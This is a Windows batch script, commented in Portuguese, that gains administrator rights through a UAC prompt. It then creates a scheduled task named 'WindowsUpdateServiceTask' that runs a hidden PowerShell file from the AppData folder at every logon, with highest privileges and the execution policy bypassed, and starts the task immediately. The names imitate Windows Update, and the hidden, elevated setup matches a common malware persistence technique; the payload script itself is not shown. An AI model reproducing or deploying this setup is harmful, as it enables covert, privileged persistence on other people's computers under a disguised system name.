@echo off
:: Verifica se está rodando como administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Solicitando permissao de administrador...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: Caminho do script PS
set SCRIPT_PATH=%APPDATA%\Microsoft\Windows\WindowsUpdateService.ps1

:: Nome da tarefa agendada
set TASK_NAME=WindowsUpdateServiceTask

:: Cria ou atualiza a tarefa agendada para rodar no logon do usuário com elevação e janela oculta
schtasks /Create /F /TN "%TASK_NAME%" /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT_PATH%\"" /RL HIGHEST /SC ONLOGON

echo Tarefa agendada criada/atualizada com sucesso!

:: Opcional: roda a tarefa agora (pode remover se quiser)
schtasks /Run /TN "%TASK_NAME%"

exit
